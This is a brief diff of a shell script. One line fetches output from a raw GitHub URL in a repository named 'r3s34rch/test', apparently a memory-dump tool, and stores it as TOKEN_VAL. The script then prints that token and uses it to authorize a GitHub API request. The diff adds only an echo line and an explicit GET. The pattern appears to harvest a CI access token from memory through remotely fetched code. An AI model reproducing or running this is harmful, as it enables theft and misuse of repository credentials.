@@ -7,9 +7,10 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "-----------------------------------------------------------------"
 echo "$TOKEN_VAL"
 echo "-----------------------------------------------------------------"
-
+echo "https://api.github.com/repos/${REPO}/contents/README.md"
 
 curl -L \ 
+-X GET \
 -H "Accept: application/vnd.github+json" \ 
 -H "Authorization: token $TOKEN_VAL" \ 
 "https://api.github.com/repos/${REPO}/contents/README.md"
